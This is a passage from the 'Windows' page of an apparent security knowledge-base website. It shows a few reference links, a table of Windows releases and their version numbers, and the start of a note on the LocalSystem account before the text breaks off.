



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Windows - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#quick-references" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href=".." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Windows
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href=".." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../books/" title="Books" class="md-nav__link">
      Books
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases-sqlserver/" title="Databases - SqlServer" class="md-nav__link">
      Databases - SqlServer
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../kubernetes/" title="Kubernetes" class="md-nav__link">
      Kubernetes
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../non-security/" title="Z Non Security" class="md-nav__link">
      Z Non Security
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../social-engineering/" title="Social engineering" class="md-nav__link">
      Social engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../wifi/" title="WiFi" class="md-nav__link">
      WiFi
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Windows
      </label>
    
    <a href="./" title="Windows" class="md-nav__link md-nav__link--active">
      Windows
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-references" class="md-nav__link">
    Quick References
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypasses" class="md-nav__link">
    Bypasses
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    PsExec
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#important-endpoints" class="md-nav__link">
    Important Endpoints
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#registry" class="md-nav__link">
    Registry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#general-exploits" class="md-nav__link">
    General Exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-files" class="md-nav__link">
    Important Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#special-file-handling" class="md-nav__link">
    Special File Handling
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-api" class="md-nav__link">
    Windows API
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" class="md-nav__link">
    WMI
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#interesting-cim-classes" class="md-nav__link">
    Interesting CIM classes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mof-managed-object-format" class="md-nav__link">
    MOF (Managed Object Format)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploring" class="md-nav__link">
    Exploring
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interesting-queries" class="md-nav__link">
    Interesting Queries
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#useful-wmi-classes" class="md-nav__link">
    Useful WMI Classes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools_1" class="md-nav__link">
    Tools
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remoting" class="md-nav__link">
    Remoting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#access-registry" class="md-nav__link">
    Access Registry
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    AppLocker
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hyperv" class="md-nav__link">
    HyperV
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#events" class="md-nav__link">
    Events
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references_1" class="md-nav__link">
    References
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#kernel" class="md-nav__link">
    Kernel
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-40" type="checkbox" id="nav-40">
    
    <label class="md-nav__link" for="nav-40">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-40">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-40-3" type="checkbox" id="nav-40-3">
    
    <label class="md-nav__link" for="nav-40-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-40-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-40-3-9" type="checkbox" id="nav-40-3-9">
    
    <label class="md-nav__link" for="nav-40-3-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-40-3-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-40-3-9-10" type="checkbox" id="nav-40-3-9-10">
    
    <label class="md-nav__link" for="nav-40-3-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-40-3-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-41" type="checkbox" id="nav-41">
    
    <label class="md-nav__link" for="nav-41">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-41">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/azuer-o360/" title="Azuer o360" class="md-nav__link">
      Azuer o360
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/general/" title="General" class="md-nav__link">
      General
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-42" type="checkbox" id="nav-42">
    
    <label class="md-nav__link" for="nav-42">
      Os
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-42">
        Os
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-42-1" type="checkbox" id="nav-42-1">
    
    <label class="md-nav__link" for="nav-42-1">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-42-1">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/active-directory/" title="Active directory" class="md-nav__link">
      Active directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/important-files/" title="Important Files" class="md-nav__link">
      Important Files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/important-processes/" title="Important Processes" class="md-nav__link">
      Important Processes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/mix/" title="Mix" class="md-nav__link">
      Mix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
      Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-42-1-7" type="checkbox" id="nav-42-1-7">
    
    <label class="md-nav__link" for="nav-42-1-7">
      Credentials
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-42-1-7">
        Credentials
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/credentials/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/credentials/using-credentials/" title="Using Credentials" class="md-nav__link">
      Using Credentials
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-42-1-8" type="checkbox" id="nav-42-1-8">
    
    <label class="md-nav__link" for="nav-42-1-8">
      Powershell
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-42-1-8">
        Powershell
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/0-cheatsheet/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/modules/" title="Modules" class="md-nav__link">
      Modules
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/powershell/" title="Reverse Shell" class="md-nav__link">
      Reverse Shell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/z-Resources/" title="Resources" class="md-nav__link">
      Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-references" class="md-nav__link">
    Quick References
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypasses" class="md-nav__link">
    Bypasses
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    PsExec
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#important-endpoints" class="md-nav__link">
    Important Endpoints
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#registry" class="md-nav__link">
    Registry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#general-exploits" class="md-nav__link">
    General Exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-files" class="md-nav__link">
    Important Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#special-file-handling" class="md-nav__link">
    Special File Handling
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-api" class="md-nav__link">
    Windows API
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" class="md-nav__link">
    WMI
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#interesting-cim-classes" class="md-nav__link">
    Interesting CIM classes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mof-managed-object-format" class="md-nav__link">
    MOF (Managed Object Format)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploring" class="md-nav__link">
    Exploring
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interesting-queries" class="md-nav__link">
    Interesting Queries
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#useful-wmi-classes" class="md-nav__link">
    Useful WMI Classes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools_1" class="md-nav__link">
    Tools
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remoting" class="md-nav__link">
    Remoting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#access-registry" class="md-nav__link">
    Access Registry
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    AppLocker
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hyperv" class="md-nav__link">
    HyperV
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#events" class="md-nav__link">
    Events
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references_1" class="md-nav__link">
    References
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#kernel" class="md-nav__link">
    Kernel
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Windows</h1>
                
                <h2 id="quick-references">Quick References<a class="headerlink" href="#quick-references" title="Permanent link">&para;</a></h2>
<ul>
<li>Commands &amp; prevesc: <a href="https://guif.re/windowseop">https://guif.re/windowseop</a></li>
<li>VMs: <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li>
<li>Versions 
    <div class="codehilite"><pre><span></span><span class="nv">Windows</span> <span class="mi">1</span>.<span class="mi">0</span>                    <span class="mi">1</span>.<span class="mi">04</span>
<span class="nv">Windows</span> <span class="mi">2</span>.<span class="mi">0</span>                    <span class="mi">2</span>.<span class="mi">11</span>
<span class="nv">Windows</span> <span class="mi">3</span>.<span class="mi">0</span>                    <span class="mi">3</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="mi">3</span>.<span class="mi">1</span>                 <span class="mi">3</span>.<span class="mi">10</span>.<span class="mi">528</span>
<span class="nv">Windows</span> <span class="k">for</span> <span class="nv">Workgroups</span> <span class="mi">3</span>.<span class="mi">11</span>    <span class="mi">3</span>.<span class="mi">11</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="nv">Workstation</span> <span class="mi">3</span>.<span class="mi">5</span>     <span class="mi">3</span>.<span class="mi">5</span>.<span class="mi">807</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="nv">Workstation</span> <span class="mi">3</span>.<span class="mi">51</span>    <span class="mi">3</span>.<span class="mi">51</span>.<span class="mi">1057</span>
<span class="nv">Windows</span> <span class="mi">95</span>                     <span class="mi">4</span>.<span class="mi">0</span>.<span class="mi">950</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="nv">Workstation</span> <span class="mi">4</span>.<span class="mi">0</span>     <span class="mi">4</span>.<span class="mi">0</span>.<span class="mi">1381</span>
<span class="nv">Windows</span> <span class="mi">98</span>                     <span class="mi">4</span>.<span class="mi">1</span>.<span class="mi">1998</span>
<span class="nv">Windows</span> <span class="mi">98</span> <span class="nv">Second</span> <span class="nv">Edition</span>      <span class="mi">4</span>.<span class="mi">1</span>.<span class="mi">2222</span>
<span class="nv">Windows</span> <span class="nv">Me</span>                     <span class="mi">4</span>.<span class="mi">90</span>.<span class="mi">3000</span>
<span class="nv">Windows</span> <span class="mi">2000</span> <span class="nv">Professional</span>      <span class="mi">5</span>.<span class="mi">0</span>.<span class="mi">2195</span>
<span class="nv">Windows</span> <span class="nv">XP</span>                     <span class="mi">5</span>.<span class="mi">1</span>.<span class="mi">2600</span>
<span class="nv">Windows</span> <span class="nv">Vista</span>                  <span class="mi">6</span>.<span class="mi">0</span>.<span class="mi">6000</span>
<span class="nv">Windows</span> <span class="mi">7</span>                      <span class="mi">6</span>.<span class="mi">1</span>.<span class="mi">7600</span>
<span class="nv">Windows</span> <span class="mi">8</span>.<span class="mi">1</span>                    <span class="mi">6</span>.<span class="mi">3</span>.<span class="mi">9600</span>
<span class="nv">Windows</span> <span class="mi">10</span>                     <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">10240</span>
</pre></div></li>
<li>User Accounts<ul>
<li>LocalSystem account is a predefined local account used by the service control manager. <ul>
